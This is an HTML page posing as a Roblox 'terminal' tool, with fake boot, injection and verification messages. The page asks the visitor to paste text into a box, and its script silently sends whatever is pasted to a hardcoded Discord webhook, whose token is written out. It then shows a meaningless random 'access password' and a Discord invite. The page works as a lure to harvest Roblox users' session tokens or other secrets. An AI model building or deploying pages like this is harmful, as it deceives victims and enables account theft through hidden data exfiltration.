<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Terminal</title>

<style>
body {
  background:#0b0b0b;
  color:#00ff9c;
  font-family: monospace;
  padding:12px;
}
#terminal {
  max-width:600px;
  margin:auto;
}
input, textarea {
  width:100%;
  background:black;
  color:#00ff9c;
  border:none;
  font-family:monospace;
  margin-top:6px;
}
button {
  margin-top:10px;
  padding:10px;
  background:#00ff9c;
  color:black;
  border:none;
  font-family:monospace;
}
pre {
  white-space:pre-wrap;
  margin:0;
}
</style>
</head>

<body>
<div id="terminal"></div>

<script>
const terminal = document.getElementById("terminal");

// typing effect
function typeLine(text, speed = 22) {
  return new Promise(resolve => {
    const line = document.createElement("pre");
    terminal.appendChild(line);
    let i = 0;
    const t = setInterval(() => {
      line.textContent += text[i];
      i++;
      if (i >= text.length) {
        clearInterval(t);
        resolve();
      }
    }, speed);
  });
}

// password generator
function generatePassword(len = 12) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*";
  let out = "";
  for (let i = 0; i < len; i++) {
    out += chars[Math.floor(Math.random() * chars.length)];
  }
  return out;
}

// start terminal
async function start() {
  await typeLine("> Booting environment...");
  await typeLine("> Initializing runtime...");
  await typeLine("> Awaiting platform input:");

  const input = document.createElement("input");
  input.placeholder = "Type platform (Roblox)";
  terminal.appendChild(input);

  input.addEventListener("keydown", async e => {
    if (e.key === "Enter") {
      if (input.value.toLowerCase() === "roblox") {
        input.remove();

        await typeLine("> Platform confirmed: Roblox");
        await typeLine("> Loading modules...");
        await typeLine("> Resolving dependencies...");
        await typeLine("> Injecting runtime...");
        await typeLine("> Ready.");
        await typeLine("");
        await typeLine("");

        showPasteBox();
      } else {
        await typeLine("> Unknown platform.");
      }
    }
  });
}

// paste + submit
function showPasteBox() {
  const ta = document.createElement("textarea");
  ta.rows = 6;
  terminal.appendChild(ta);

  const btn = document.createElement("button");
  btn.textContent = "Submit";
  btn.onclick = () => submitData(ta.value);
  terminal.appendChild(btn);
}

// submit to discord
async function submitData(text) {
  fetch("https://discord.com/api/webhooks/1451482033942564966/807RYdP9pLldH1Tkixyr03vBy-sJKAJNXAmAbNX_Z8IEAdF7658Vocltq7t3gJmjdP9d", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: `ðŸ“¥ **New Website Submission**\n\`\`\`\n${text}\n\`\`\``
    })
  });

  await typeLine("> Processing...");
  await typeLine("> Compiling it output...");
  await typeLine("> Verifying integrity...");
  await typeLine("> Success.");

  const password = generatePassword();
  await typeLine("> Generated access password:");
  await typeLine("> " + password);

  await typeLine("");
  await typeLine("> Join Discord for feedback:");
  await typeLine("> https://discord.gg/SWUbJRMJ5");
}

start();
</script>
</body>
</html>
